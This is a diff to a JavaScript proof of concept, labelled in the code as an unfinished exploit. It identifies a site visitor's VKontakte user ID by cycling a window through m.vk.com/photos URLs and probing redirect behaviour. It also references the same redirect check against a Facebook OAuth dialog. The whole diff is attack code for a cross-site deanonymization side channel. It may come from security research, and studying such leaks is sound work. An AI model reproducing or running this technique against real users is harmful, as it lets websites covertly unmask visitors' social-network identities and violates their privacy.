@@ -155,15 +155,29 @@ check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt
 
 //vkontakte ID detection
 
+
 var vk_base = 'http://m.vk.com/photos';
-var your_mln = parseInt(prompt('In which mln your ID is? for example 17000000'));
+var start = parseInt(prompt('In which 100 000 your ID is? for example 12300000'));
 var steps = [100000,10000,1000,100,10,1];
-var stack = [];
+
+var get_assigner = function(from, to){
+  return function(w){
+    for(var i=from;i < to;i++){
+      w.location='http://m.vk.com/photos'+i+'#';
+      if(i%10000==0) console.log('bunch '+i);
+    }
+  }
+}
+
+check_redirect(vk_base, function(guess){
+  debug('ID inside of '+start+'  '+(guess ? 'yes' : 'no'));
+}, get_assigner(start, start+100000))
+
+//not finished proto of exploit
 
 var get_cb = function(start){
   return function(guess){
     if(!guess) return false;
-
 
     var step = steps.shift();
     if(step){
@@ -179,16 +193,6 @@ var get_cb = function(start){
       debug('vk id found: '+ start);
     }
   };
-}
-
-
-var get_assigner = function(from, to){
-  return function(w){
-    for(var i=from;i < to;i++){
-      w.location='http://m.vk.com/photos'+i+'#';
-      if(i%100000==0) console.log('bunch '+i);
-    }
-  }
 }
 
 
